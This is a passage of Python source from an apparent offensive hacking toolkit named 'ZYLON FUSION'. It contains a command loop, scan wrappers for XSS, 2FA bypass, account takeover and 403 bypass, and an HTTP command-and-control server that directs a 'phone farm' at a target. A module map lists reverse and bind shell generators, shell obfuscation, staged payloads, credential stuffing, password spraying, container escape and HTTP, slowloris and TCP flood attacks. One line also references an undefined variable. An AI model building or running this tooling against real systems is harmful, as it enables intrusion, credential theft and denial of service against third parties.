        mobile_vuln = all_results.get('mobile_security', {}).get('vulnerable', False)
        total_vulns = sum([bounty_vuln, cache_vuln, mobile_vuln])
        console.print(f"\n[bold green][+] Combined scan: Bounty({'V' if bounty_vuln else '-'}) + "
                      f"Cache({'V' if cache_vuln else '-'}) + Mobile({'V' if mobile_vuln else '-'}) = "
                      f"{total_vuln} vulnerable categories[/bold green]")

    def run_ai_analysis(self):
        """AI-powered vulnerability analysis"""
        if not self.results or not self.results.get('findings'):
            console.print("[bold yellow][!] Run a scan first before AI analysis[/bold yellow]")
            return
        
        console.print("\n[bold magenta][*] AI-Powered Vulnerability Analysis[/bold magenta]")
        with console.status("[bold magenta]AI is analyzing scan results...[/bold magenta]"):
            analysis = self.ai.analyze_results(self.results)
        
        if analysis:
            console.print(Panel(
                analysis.get('summary', 'No analysis available'),
                title="[bold magenta]AI Analysis[/bold magenta]",
                border_style="magenta"
            ))
        else:
            console.print("[bold yellow][!] AI analysis unavailable - check API key configuration[/bold yellow]")
    
    def run(self):
        """Main ZYLON FUSION loop"""
        self.ui.display_banner()
        
        while True:
            try:
                console.print("\n[bold red]ZYLON[/bold red] [bold yellow]>[/bold yellow] ", end="")
                user_input = input().strip()
                
                if not user_input:
                    continue
                
                if user_input.lower() in ['exit', 'quit', 'q']:
                    console.print("[bold red][*] ZYLON FUSION signing off... Stay sharp![/bold red]")
                    break
                
                elif user_input.lower() == 'help':
                    self.ui.display_help()
                
                elif user_input.lower() == 'fix':
                    install_requirements()
                
                elif user_input.lower() == 'update':
                    console.print("[cyan][*] Checking for updates...[/cyan]")
                    try:
                        import subprocess
                        result = subprocess.run(['git', 'pull'], capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            if 'Already up to date' in result.stdout:
                                console.print("[green][+] Already running latest version![/green]")
                            else:
                                console.print("[bold green][+] Updated successfully![/bold green]")
                                console.print(result.stdout[:500])
                        else:
                            console.print(f"[yellow][!] Update check: {result.stdout[:200]}[/yellow]")
                    except Exception as e:
                        console.print(f"[yellow][!] Update check failed: {str(e)[:100]}[/yellow]")
                        console.print("[cyan]    Manual: git pull in the zylon-fusion directory[/cyan]")
                
                elif user_input.lower() == 'config':
                    self._config_menu()
                
                elif user_input.lower() == 'report':
                    self._report_menu()
                
                elif user_input.lower() == 'ai':
                    self.run_ai_analysis()
                
                elif user_input.lower() == 'scope':
                    self._scope_menu()

                elif user_input.lower() == 'perf':
                    self._show_perf_stats()

                elif user_input.lower().startswith('search '):
                    self._search_scans(user_input[7:].strip())

                elif user_input.lower() == 'search':
                    query = Prompt.ask("[bold yellow]Search scans (keyword)[/bold yellow]")
                    self._search_scans(query)

                elif user_input.lower() == 'checkpoints':
                    self._list_checkpoints()

                elif user_input.lower() == 'tools':
                    self._tools_status()

                elif user_input.lower().startswith('resume '):
                    # resume <target> <group_id>
                    parts = user_input[7:].strip().split()
                    if len(parts) >= 1:
                        target = parts[0]
                        group_id = parts[1] if len(parts) > 1 else None
                        success, msg = self.set_target(target)
                        if success:
                            console.print(f"[green][+] {msg}[/green]")
                            if group_id:
                                cp = self._load_checkpoint(group_id)
                                if cp:
                                    console.print(f"[cyan][*] Resuming {group_id} from checkpoint ({len(cp.get('completed_scans',[]))}/{len(cp.get('scan_ids',[]))} done)[/cyan]")
                                else:
                                    console.print(f"[yellow][!] No checkpoint found for {group_id}[/yellow]")
                            else:
                                self._list_checkpoints()
                        else:
                            console.print(f"[red][!] {msg}[/red]")

                elif user_input.lower() == 'poc':
                    self._poc_menu()

                elif user_input.lower() == 'group':
                    self.group_menu()

                elif (user_input.isdigit() and 0 <= int(user_input) <= 427) or user_input in ['98a', '98b', '98c', '98d', '98e']:
                    if not self.target:
                        target = Prompt.ask("[bold yellow]Enter target domain/IP[/bold yellow]")
                        success, msg = self.set_target(target)
                        if not success:
                            console.print(f"[bold red][!] {msg}[/bold red]")
                            continue
                        console.print(f"[green][+] {msg}[/green]")
                    self.run_scan(user_input)
                
                else:
                    # Try to set as target
                    success, msg = self.set_target(user_input)
                    if success:
                        console.print(f"[green][+] {msg}[/green]")
                        # Ask for scan type
                        scan_type = Prompt.ask(
                            "[bold yellow]Select scan type (0-427, 98a-98e, 99)[/bold yellow]",
                            default="0"
                        )
                        if (scan_type.isdigit() and 0 <= int(scan_type) <= 427) or scan_type in ['98a', '98b', '98c', '98d', '98e']:
                            self.run_scan(scan_type)
                    else:
                        console.print(f"[bold red][!] {msg}[/bold red]")
                
            except KeyboardInterrupt:
                console.print("\n[bold yellow][!] Use 'exit' to quit[/bold yellow]")
            except EOFError:
                break
            except Exception as e:
                console.print(f"[bold red][!] Error: {str(e)}[/bold red]")
    
    # ========================================================================
    # V3 SECURITY ENGINE SCANS (400-411)
    # ========================================================================

    def _scan_v3_graphql(self):
        """400: GraphQL Security Tester (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 GraphQL Security Test...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_graphql(url)
            self.results['findings']['v3_graphql'] = result
            if result.get('vulnerable') or result.get('graphql_found'):
                console.print(f"[bold green][+] GraphQL found! {len(result.get('findings',[]))} issues[/bold green]")
            else:
                console.print("[dim][-] No GraphQL issues found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_dom_xss(self):
        """401: DOM XSS Scanner (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 DOM XSS Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_dom_xss(url)
            self.results['findings']['v3_dom_xss'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] DOM XSS found! {len(result.get('findings',[]))} sinks[/bold green]")
            else:
                console.print("[dim][-] No DOM XSS found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_cache_deception(self):
        """402: Web Cache Deception (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 Cache Deception Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_cache_deception(url)
            self.results['findings']['v3_cache_deception'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Cache Deception found![/bold green]")
            else:
                console.print("[dim][-] No cache deception found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_clickjacking(self):
        """403: Clickjacking Tester (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 Clickjacking Test...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_clickjacking(url)
            self.results['findings']['v3_clickjacking'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Clickjacking vulnerable![/bold green]")
            else:
                console.print("[dim][-] No clickjacking found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_account_takeover(self):
        """404: Account Takeover (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 Account Takeover Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_account_takeover(url)
            self.results['findings']['v3_ato'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] ATO vectors found![/bold green]")
            else:
                console.print("[dim][-] No ATO vectors found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_oauth(self):
        """405: OAuth Misconfiguration (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 OAuth Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_oauth_misconfig(url)
            self.results['findings']['v3_oauth'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] OAuth misconfig found![/bold green]")
            else:
                console.print("[dim][-] No OAuth issues found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_http_method(self):
        """406: HTTP Method Tampering (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 HTTP Method Tampering...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_http_method_tampering(url)
            self.results['findings']['v3_http_method'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] HTTP Method tampering found![/bold green]")
            else:
                console.print("[dim][-] No method tampering found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_blind_xss(self):
        """407: Blind XSS Scanner (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 Blind XSS Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_blind_xss(url)
            self.results['findings']['v3_blind_xss'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Blind XSS vectors found![/bold green]")
            else:
                console.print("[dim][-] No blind XSS found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_2fa_bypass(self):
        """408: 2FA Bypass Tester (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 2FA Bypass Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_2fa_bypass(url)
            self.results['findings']['v3_2fa_bypass'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] 2FA bypass found![/bold green]")
            else:
                console.print("[dim][-] No 2FA bypass found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_mixed_content(self):
        """409: Mixed Content Scanner (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 Mixed Content Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_mixed_content(url)
            self.results['findings']['v3_mixed_content'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Mixed content found![/bold green]")
            else:
                console.print("[dim][-] No mixed content issues[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_info_disclosure(self):
        """410: Information Disclosure (V3 Engine)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            with console.status("[bold cyan]V3 Info Disclosure Scan...[/bold cyan]"):
                engine = V3SecurityEngine()
                result = engine.scan_info_disclosure(url)
            self.results['findings']['v3_info_disclosure'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Info disclosure found![/bold green]")
            else:
                console.print("[dim][-] No info disclosure found[/dim]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    def _scan_v3_full(self):
        """411: V3 Security Full Scan (All 12 Modules)"""
        url = f"{self.protocol}{self.target}"
        if V3SecurityEngine:
            console.print(f"\n[bold red][*] V3 SECURITY FULL SCAN on {self.target}[/bold red]")
            engine = V3SecurityEngine()
            all_results = {}
            scans = [
                ('GraphQL', engine.scan_graphql),
                ('DOM XSS', engine.scan_dom_xss),
                ('Cache Deception', engine.scan_cache_deception),
                ('Clickjacking', engine.scan_clickjacking),
                ('Account Takeover', engine.scan_account_takeover),
                ('OAuth', engine.scan_oauth_misconfig),
                ('HTTP Method', engine.scan_http_method_tampering),
                ('Blind XSS', engine.scan_blind_xss),
                ('2FA Bypass', engine.scan_2fa_bypass),
                ('Mixed Content', engine.scan_mixed_content),
                ('Info Disclosure', engine.scan_info_disclosure),
            ]
            vuln_count = 0
            for name, func in scans:
                with console.status(f"[cyan]V3: {name}...[/cyan]"):
                    try:
                        r = func(url)
                        all_results[name] = r
                        if r.get('vulnerable'):
                            vuln_count += 1
                            console.print(f"  [green][+] {name}: VULNERABLE[/green]")
                        else:
                            console.print(f"  [dim][-] {name}: Clean[/dim]")
                    except Exception as e:
                        all_results[name] = {'error': str(e)}
            self.results['findings']['v3_full'] = all_results
            console.print(f"\n[bold green][+] V3 Full: {vuln_count}/{len(scans)} vulnerable[/bold green]")
        else:
            console.print("[bold red][!] V3 Security Engine not available[/bold red]")

    # ========================================================================
    # V4 HUNTING ENGINE SCANS (412-419)
    # ========================================================================

    def _scan_v4_username_enum(self):
        """412: Username Enumeration (V4 Hunting)"""
        url = f"{self.protocol}{self.target}"
        if V4HuntingEngine:
            login_url = Prompt.ask("[yellow]Login URL[/yellow]", default=f"{url}/login")
            with console.status("[bold cyan]V4 Username Enumeration...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_username_enum(login_url)
            self.results['findings']['v4_username_enum'] = result
            if result.get('differential_detected'):
                console.print(f"[bold green][+] Usernames enumerated: {len(result.get('confirmed_usernames',[]))}[/bold green]")
            else:
                console.print("[dim][-] No differential response detected[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    def _scan_v4_email_security(self):
        """413: Email Security (DMARC/DKIM/SPF) (V4 Hunting)"""
        if V4HuntingEngine:
            domain = self.target.replace('www.', '').split(':')[0]
            with console.status("[bold cyan]V4 Email Security Scan...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_email_security(domain)
            self.results['findings']['v4_email_security'] = result
            if result.get('vulnerable') or result.get('misconfigured'):
                console.print(f"[bold green][+] Email security issues found![/bold green]")
            else:
                console.print("[dim][-] Email security properly configured[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    def _scan_v4_csrf(self):
        """414: CSRF Detection (V4 Hunting)"""
        url = f"{self.protocol}{self.target}"
        if V4HuntingEngine:
            with console.status("[bold cyan]V4 CSRF Scan...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_csrf(url)
            self.results['findings']['v4_csrf'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] CSRF vulnerability found![/bold green]")
            else:
                console.print("[dim][-] No CSRF issues found[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    def _scan_v4_framework(self):
        """415: Framework Detection (V4 Hunting)"""
        url = f"{self.protocol}{self.target}"
        if V4HuntingEngine:
            with console.status("[bold cyan]V4 Framework Detection...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_framework(url)
            self.results['findings']['v4_framework'] = result
            if result.get('detected'):
                fws = result.get('frameworks', [])
                console.print(f"[bold green][+] Frameworks detected: {', '.join(fws)}[/bold green]")
            else:
                console.print("[dim][-] No frameworks detected[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    def _scan_v4_js_libraries(self):
        """416: JS Library Vulnerabilities (V4 Hunting)"""
        url = f"{self.protocol}{self.target}"
        if V4HuntingEngine:
            with console.status("[bold cyan]V4 JS Library Scan...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_js_libraries(url)
            self.results['findings']['v4_js_libs'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Vulnerable JS libraries found![/bold green]")
            else:
                console.print("[dim][-] No vulnerable JS libraries[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    def _scan_v4_403_bypass(self):
        """417: 403 Bypass Advanced (V4 Hunting)"""
        url = f"{self.protocol}{self.target}"
        if V4HuntingEngine:
            with console.status("[bold cyan]V4 403 Bypass Scan...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_403_bypass(url)
            self.results['findings']['v4_403_bypass'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] 403 bypass found![/bold green]")
            else:
                console.print("[dim][-] No 403 bypass found[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    def _scan_v4_cross_domain(self):
        """418: Cross-Domain Policy (V4 Hunting)"""
        if V4HuntingEngine:
            domain = self.target.replace('www.', '').split(':')[0]
            with console.status("[bold cyan]V4 Cross-Domain Scan...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_cross_domain(domain)
            self.results['findings']['v4_cross_domain'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Cross-domain issues found![/bold green]")
            else:
                console.print("[dim][-] No cross-domain issues[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    def _scan_v4_cve_lookup(self):
        """419: CVE-to-Exploit Lookup (V4 Hunting)"""
        if V4HuntingEngine:
            software = Prompt.ask("[yellow]Software name[/yellow]", default="apache")
            version = Prompt.ask("[yellow]Version (optional)[/yellow]", default="")
            with console.status("[bold cyan]V4 CVE Lookup...[/bold cyan]"):
                engine = V4HuntingEngine()
                result = engine.scan_cve_lookup(software, version or None)
            self.results['findings']['v4_cve_lookup'] = result
            if result.get('cves'):
                console.print(f"[bold green][+] {len(result['cves'])} CVEs found![/bold green]")
            else:
                console.print("[dim][-] No CVEs found[/dim]")
        else:
            console.print("[bold red][!] V4 Hunting Engine not available[/bold red]")

    # ========================================================================
    # V5 ASYNC ENGINE SCANS (420-422)
    # ========================================================================

    def _scan_v5_subdomain_bruteforce(self):
        """420: Async Subdomain Brute Force (V5 Engine)"""
        if V5AsyncEngine:
            domain = self.target.replace('www.', '').split(':')[0]
            with console.status("[bold cyan]V5 Async Subdomain Brute Force...[/bold cyan]"):
                engine = V5AsyncEngine()
                result = engine.scan_subdomain_bruteforce(domain)
            self.results['findings']['v5_subdomain_bf'] = result
            found = result.get('found', [])
            if found:
                console.print(f"[bold green][+] {len(found)} subdomains found![/bold green]")
            else:
                console.print("[dim][-] No subdomains found[/dim]")
        else:
            console.print("[bold red][!] V5 Async Engine not available[/bold red]")

    def _scan_v5_dir_bruteforce(self):
        """421: Async Directory Brute Force (V5 Engine)"""
        if V5AsyncEngine:
            url = f"{self.protocol}{self.target}"
            with console.status("[bold cyan]V5 Async Dir Brute Force...[/bold cyan]"):
                engine = V5AsyncEngine()
                result = engine.scan_dir_bruteforce_async(url)
            self.results['findings']['v5_dir_bf'] = result
            found = result.get('found', [])
            if found:
                console.print(f"[bold green][+] {len(found)} directories found![/bold green]")
            else:
                console.print("[dim][-] No directories found[/dim]")
        else:
            console.print("[bold red][!] V5 Async Engine not available[/bold red]")

    def _scan_v5_smart(self):
        """422: AI Smart Scan (V5 Engine)"""
        if V5AsyncEngine:
            url = f"{self.protocol}{self.target}"
            with console.status("[bold cyan]V5 AI Smart Scan...[/bold cyan]"):
                engine = V5AsyncEngine()
                result = engine.scan_smart(url, ai_bridge=self.ai if hasattr(self, 'ai') else None)
            self.results['findings']['v5_smart'] = result
            if result.get('vulnerable'):
                console.print(f"[bold green][+] Smart scan found vulnerabilities![/bold green]")
            else:
                console.print("[dim][-] No vulnerabilities found[/dim]")
        else:
            console.print("[bold red][!] V5 Async Engine not available[/bold red]")

    # ========================================================================
    # HTTP C2 SERVER (423)
    # ========================================================================

    def _scan_http_c2(self):
        """423: HTTP C2 Server for Phone Farm"""
        if HTTPC2Server:
            port = Prompt.ask("[yellow]C2 Server Port[/yellow]", default="9999")
            target = Prompt.ask("[yellow]Target for phone farm[/yellow]", default=self.target)
            console.print(f"\n[bold red][*] Starting HTTP C2 Server on port {port}[/bold red]")
            console.print(f"[cyan]Target: {target}[/cyan]")
            console.print(f"[dim]Phones will poll this server for commands[/dim]")
            try:
                c2 = HTTPC2Server(port=int(port))
                c2.target = target
                c2.start_interactive()
            except KeyboardInterrupt:
                console.print("\n[bold yellow][!] C2 Server stopped[/bold yellow]")
            except Exception as e:
                console.print(f"[bold red][!] C2 Error: {str(e)}[/bold red]")
        else:
            console.print("[bold red][!] HTTP C2 Server not available[/bold red]")

    def _build_scan_map(self):
        """Build the scan_map dictionary (extracted from run_scan for thread-safe access)"""
        return {
            '0': self._scan_full_recon,
            '1': self._scan_whois,
            '2': self._scan_geoip,
            '3': self._scan_dns,
            '4': self._scan_subdomains,
            '5': self._scan_ports,
            '6': self._scan_banners,
            '7': self._scan_headers,
            '8': self._scan_ssl,
            '9': self._scan_sqli,
            '10': self._scan_xss,
            '11': self._scan_dirbrute,
            '12': self._scan_wordpress,
            '13': self._scan_cors,
            '14': self._scan_openredirect,
            '15': self._scan_crlf,
            '16': self._scan_cookies,
            '17': self._scan_javascript,
            '18': self._scan_cloudbuckets,
            '19': self._scan_waf,
            '20': self._scan_techstack,
            '21': self._scan_fullvuln,
            '22': self._scan_nuclear,
            '23': self._scan_deep_crawl,
            '24': self._scan_param_mining,
            '25': self._scan_wayback,
            '26': self._scan_google_dork,
            '27': self._scan_github_dork,
            '28': self._scan_deep_js,
            '29': self._scan_takeover,
            '30': self._scan_ssrf,
            '31': self._scan_ssti,
            '32': self._scan_lfi,
            '33': self._scan_xxe,
            '34': self._scan_idor,
            '35': self._scan_race,
            '36': self._scan_proto_pollution,
            '37': self._scan_cache_poison,
            '38': self._scan_smuggling,
            '39': self._scan_host_header,
            '40': self._scan_jwt,
            '41': self._scan_broken_auth,
            '44': self._scan_api_fuzzer,
            '45': self._scan_rate_limit,
            '46': self._scan_sensitive_files,
            '47': self._scan_email_enum,
            '48': self._scan_broken_links,
            '49': self._scan_tech_cve,
            '50': self._scan_origin_ip_quick,
            '51': self._scan_origin_ip_full,
            '52': self._scan_cdn_detection,
            '53': self._scan_dns_cert_hunt,
            '54': self._scan_subdomain_origin,
            '55': self._scan_ip_verify,
            '56': self._scan_blind_sqli_detect,
            '57': self._scan_blind_sqli_schemas,
            '58': self._scan_blind_sqli_meta,
            '59': self._scan_blind_sqli_data,
            '60': self._scan_blind_sqli_full,
            '61': self._scan_cmd_inject_detect,
            '62': self._scan_cmd_inject_os,
            '63': self._scan_cmd_inject_shell,
            '64': self._scan_ssrf_detect,
            '65': self._scan_ssrf_cloud_meta,
            '66': self._scan_ssrf_fileread,
            '67': self._scan_ssrf_portscan,
            '68': self._scan_ssrf_network,
            '69': self._scan_race_single,
            '70': self._scan_race_multi,
            '71': self._scan_race_toctou,
            '72': self._scan_graphql_full,
            '73': self._scan_graphql_discover,
            '74': self._scan_graphql_introspection,
            '75': self._scan_graphql_dos,
            '76': self._scan_graphql_csrf,
            '77': self._scan_ciphey_decode,
            '78': self._scan_hash_identify,
            '79': self._scan_jwt_full,
            '80': self._scan_jwt_key_confusion,
            '81': self._scan_jwt_alg_none,
            '82': self._scan_jwt_kid_inject,
            '83': self._scan_jwt_crack,
            '84': self._scan_ssti_detect,
            '85': self._scan_ssti_exploit,
            '86': self._scan_nosql_detect,
            '87': self._scan_nosql_bypass,
            '88': self._scan_nosql_extract,
            '89': self._scan_container_full,
            '90': self._scan_container_escape,
            '91': self._scan_waf_evasion,
            '92': self._scan_websocket,
            '93': self._scan_smuggling_adv,
            '94': self._scan_crlf_adv,
            '95': self._scan_openredirect_adv,
            '96': self._scan_403bypass,
            '97': self._scan_paramspider,
            '98': self._scan_linkfinder,
            '98a': self._scan_arjun,
            '98b': self._scan_ghauri,
            '98c': self._scan_cmseek,
            '98d': self._scan_sherlock,
            '98e': self._scan_tehqeeq,
            '100': self._scan_lfi_detect,
            '101': self._scan_lfi_exploit,
            '102': self._scan_lfi_rce,
            '103': self._scan_xss_reflected,
            '104': self._scan_xss_dom,
            '105': self._scan_xss_blind,
            '106': self._scan_xss_full,
            '107': self._scan_subdomain_passive,
            '108': self._scan_subdomain_bruteforce,
            '109': self._scan_subdomain_full,
            '110': self._scan_hash_identify_crypto,
            '111': self._scan_hash_crack,
            '112': self._scan_auto_decode,
            '113': self._scan_reverse_shell,
            '114': self._scan_hoaxshell,
            '115': self._scan_cms_detect,
            '116': self._scan_cms_wordpress,
            '117': self._scan_cms_full,
            '118': self._scan_osint_emails,
            '119': self._scan_osint_dorks,
            '120': self._scan_osint_full,
            '121': self._scan_cloud_metadata,
            '122': self._scan_cloud_s3,
            '123': self._scan_cloud_gopherus,
            '124': self._scan_cloud_full,
            '125': self._scan_cors_misconfig,
            '126': self._scan_open_redirect_adv,
            '127': self._scan_xxe_detect,
            '128': self._scan_xxe_extract,
            '129': self._scan_xxe_deser,
            '130': self._scan_ssti_sandbox,
            '131': self._scan_proto_pollution_adv,
            '132': self._scan_csp_analysis,
            '133': self._scan_cache_poison_adv,
            '134': self._scan_blind_sqli_headers,
            '135': self._scan_git_exposure,
            '136': self._scan_sensitive_files_adv,
            '137': self._scan_github_dork_adv,
            '138': self._scan_oast_callback,
            '139': self._scan_redos,
            '140': self._scan_password_spray,
            '141': self._scan_stealth,
            '142': self._scan_wordlist_gen,
            '143': self._scan_adv_web_full,
            '144': self._scan_sqli_detection,
            '145': self._scan_sqli_exploitation,
            '146': self._scan_sqli_dios,
            '147': self._scan_sqli_waf_bypass,
            '148': self._scan_xss_reflected_adv,
            '149': self._scan_xss_dom_adv,
            '150': self._scan_xss_blind_adv,
            '151': self._scan_xss_context_aware,
            '152': self._scan_xss_full_adv,
            '153': self._scan_sqli_full,
            '154': self._scan_lfi_advanced_detect,
            '155': self._scan_lfi_php_wrappers,
            '156': self._scan_lfi_log_poisoning,
            '157': self._scan_lfi_proc_self,
            '158': self._scan_lfi_waf_bypass,
            '159': self._scan_lfi_auto_exploit,
            '160': self._scan_path_traversal_detect,
            '161': self._scan_path_traversal_config,
            '162': self._scan_path_traversal_encoding,
            '163': self._scan_lfi_pathtraversal_full,
            '164': self._scan_subdomain_passive_adv,
            '165': self._scan_subdomain_bruteforce_adv,
            '166': self._scan_subdomain_cert_adv,
            '167': self._scan_subdomain_takeover_adv,
            '168': self._scan_subdomain_cloud_assets,
            '169': self._scan_subdomain_full_recon_adv,
            '170': self._scan_osint_email_harvest_adv,
            '171': self._scan_osint_google_dorks_adv,
            '172': self._scan_osint_dns_recon_adv,
            '173': self._scan_osint_full_adv,
            '184': self._scan_tplmap_ssti_detect,
            '185': self._scan_tplmap_ssti_identify,
            '186': self._scan_tplmap_sandbox_escape,
            '187': self._scan_tplmap_exec_code,
            '188': self._scan_tplmap_blind_detect,
            '189': self._scan_nuclei_template,
            '190': self._scan_nuclei_cve,
            '191': self._scan_nuclei_exposed_panels,
            '192': self._scan_nuclei_default_creds,
            '193': self._scan_nuclei_full,
            '174': self._scan_wapiti_xss,
            '175': self._scan_wapiti_sqli,
            '176': self._scan_wapiti_ssrf,
            '177': self._scan_wapiti_full,
            '178': self._scan_dirsearch_quick,
            '179': self._scan_dirsearch_recursive,
            '180': self._scan_dirsearch_extension,
            '181': self._scan_dirsearch_deep,
            '182': self._scan_wapiti_crlf,
            '183': self._scan_wapiti_cmd_injection,
            '194': self._scan_flask_session_brute,
            '195': self._scan_session_cookie_security,
            '196': self._scan_session_fixation,
            '197': self._scan_session_security_full,
            '198': self._scan_java_deserialization,
            '199': self._scan_php_deserialization,
            '200': self._scan_python_deserialization,
            '201': self._scan_deserialization_payload,
            '202': self._scan_blind_deserialization,
            '203': self._scan_deserialization_full,
            '204': self._scan_cloud_s3_adv,
            '205': self._scan_cloud_azure_adv,
            '206': self._scan_cloud_gcp_adv,
            '207': self._scan_cloud_metadata_adv,
            '208': self._scan_cloud_credential_adv,
            '209': self._scan_cloud_misconfig_adv,
            '210': self._scan_cloud_full_adv,
            '211': self._scan_container_docker_api_adv,
            '212': self._scan_container_escape_adv,
            '213': self._scan_container_full_adv,
            '214': self._scan_password_spraying,
            '215': self._scan_credential_stuffing,
            '216': self._scan_username_enumeration,
            '217': self._scan_auth_testing_full,
            '218': self._scan_takeover_advanced_check,
            '219': self._scan_takeover_advanced_mass,
            '220': self._scan_takeover_advanced_cname,
            '221': self._scan_takeover_advanced_full,
            '222': self._scan_cors_advanced_origin,
            '223': self._scan_cors_advanced_null,
            '224': self._scan_cors_advanced_subdomain,
            '225': self._scan_cors_advanced_misconfig,
            '226': self._scan_cors_advanced_full,
            '227': self._scan_password_spraying_stealth,
            '228': self._scan_api_auth_testing,
            '229': self._scan_http_form_auth,
            '230': self._scan_takeover_advanced_service_verify,
            '231': self._scan_cors_advanced_credential,
            '232': self._scan_cors_csrf_chain,
            '233': self._scan_credential_full,
            '234': self._scan_oast_blind_ssrf,
            '235': self._scan_oast_blind_xxe,
            '236': self._scan_oast_blind_cmdi,
            '237': self._scan_oast_blind_xss,
            '238': self._scan_oast_full_callback,
            '239': self._scan_redos_detection,
            '240': self._scan_csp_analysis_adv,
            '241': self._scan_csp_bypass_finder,
            '242': self._scan_csp_redos_full,
            '243': self._scan_git_exposure_adv,
            '244': self._scan_git_repo_dump,
            '245': self._scan_github_dork_search,
            '246': self._scan_svn_hg_bzr_exposure,
            '247': self._scan_git_full_security,
            '248': self._scan_oast_callback_server,
            '249': self._scan_redos_exploit_gen,
            '250': self._scan_csp_xss_bypass,
            '251': self._scan_git_secret_scan,
            '252': self._scan_github_code_search,
            '253': self._scan_redos_csp_git_combined,
            '254': self._scan_content_fuzz,
            '255': self._scan_api_endpoint_fuzz,
            '256': self._scan_parameter_fuzz,
            '257': self._scan_header_fuzz,
            '258': self._scan_vhost_discovery,
            '259': self._scan_recursive_fuzz,
            '260': self._scan_web_fuzzer_full,
            '261': self._scan_reverse_shell_gen,
            '262': self._scan_bind_shell_gen,
            '263': self._scan_shell_obfuscation,
            '264': self._scan_shell_payload_full,
            '265': self._scan_hash_identify_adv,
            '266': self._scan_hash_crack_adv,
            '267': self._scan_hash_batch_crack,
            '268': self._scan_hash_online_crack,
            '269': self._scan_hash_full_adv,
            '270': self._scan_api_json_fuzz,
            '271': self._scan_staged_payload_gen,
            '272': self._scan_password_candidate_gen,
            '273': self._scan_fuzzer_shell_hash_combined,
            '274': self._scan_http_flood_test,
            '275': self._scan_slowloris_test,
            '276': self._scan_tcp_flood_test,
            '277': self._scan_rate_limit_adv,
            '278': self._scan_ddos_resilience,
            '279': self._scan_ddos_full_defense,
